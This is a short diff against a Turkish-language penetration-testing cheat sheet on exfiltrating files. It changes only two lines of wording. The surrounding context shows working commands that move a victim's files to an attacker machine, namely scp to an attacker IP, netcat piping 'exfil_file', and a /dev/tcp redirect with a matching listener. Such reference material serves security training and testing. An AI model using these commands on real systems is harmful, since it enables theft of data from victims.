@@ -194,7 +194,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer kurbanın SSH'si varsa, saldırgan kurbanın bir dizinini kendi sistemine monte edebilir.
+Eğer kurbanın SSH'si varsa, saldırgan kurbanın bir dizinini saldırgana bağlayabilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -207,7 +207,7 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Kurbandan dosya indirme
+### Kurbandan dosya indir
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
